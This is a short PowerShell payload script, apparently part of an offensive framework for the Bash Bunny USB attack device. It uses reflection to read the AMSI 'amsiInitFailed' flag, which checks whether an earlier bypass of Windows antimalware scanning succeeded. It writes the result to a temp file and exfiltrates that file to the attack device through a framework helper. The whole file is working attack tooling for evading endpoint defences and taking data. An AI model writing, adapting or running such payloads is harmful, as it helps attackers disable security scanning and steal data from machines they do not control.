# Stage 1 payload for a recon example payload of the Bashbunny Powershell Framework
#
# Tests whether the AMSI bypass in the Framework worked or not and exfiltrates the answer to the BB
#
# Test AMSI bypass and capture in amsib variable (True or False value)
$amsib = [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").GetValue($null)
# Output the result into a temporary file
echo "AMSI Bypass worked - $amsib " > $env:TEMP\temp.txt
# Exfiltrate the temporary file back to the Bashbunny using a Framework helper function
Invoke-BBExfil "$env:TEMP\temp.txt"
